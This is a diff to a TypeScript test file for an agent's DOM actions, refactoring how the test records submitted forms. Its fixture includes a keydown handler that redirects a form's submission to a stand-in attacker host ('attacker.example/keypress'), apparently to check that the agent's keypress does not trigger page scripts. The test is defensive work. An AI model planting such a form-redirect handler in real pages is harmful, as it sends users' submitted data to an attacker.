@@ -1513,12 +1513,11 @@ describe("Agent DOM mutation execution", () => {
       form.action = "https://attacker.example/keypress"
     })
     input.addEventListener("keydown", keyHandler)
-    let submittedForm: HTMLFormElement | undefined
+    const submittedForms: HTMLFormElement[] = []
     vi.spyOn(HTMLFormElement.prototype, "submit").mockImplementation(function (
       this: HTMLFormElement
     ) {
-      // oxlint-disable-next-line typescript/no-this-alias -- The fixture records the actual callback receiver so assertions can verify its identity.
-      submittedForm = this
+      submittedForms.push(this)
     })
     const { effect, references } = await liveEffect(
       command({ type: "press_key", ref: "e1", key: "Enter" }),
@@ -1537,6 +1536,7 @@ describe("Agent DOM mutation execution", () => {
       signal
     })
     expect(keyHandler).not.toHaveBeenCalled()
+    const submittedForm = submittedForms[0]
     expect(submittedForm?.action).toBe(new URL("/archive", location.href).href)
     expect(submittedForm?.method).toBe("post")
     expect(submittedForm?.querySelectorAll('input[name="query"]')).toHaveLength(
